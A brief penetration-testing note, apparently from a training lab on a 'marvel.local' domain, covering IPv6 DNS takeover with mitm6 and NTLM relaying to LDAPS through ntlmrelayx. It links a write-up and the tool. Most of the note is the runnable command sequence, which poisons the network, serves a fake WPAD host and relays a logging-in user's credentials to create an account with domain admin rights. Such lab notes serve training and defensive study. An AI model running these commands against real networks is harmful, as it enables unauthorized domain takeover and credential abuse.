### Read: 
https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation

https://github.com/fox-it/mitm6


pip3 install

mitm -d marvel.local
[responses from hosts in network]

ntlmrelayx.py -6 -t ldaps://<ip> -wh fakepath.<domain> -l lootme

Wait for a user to login

(mitm makes on login)
!! Creates a user & pw with domain admin credentials !!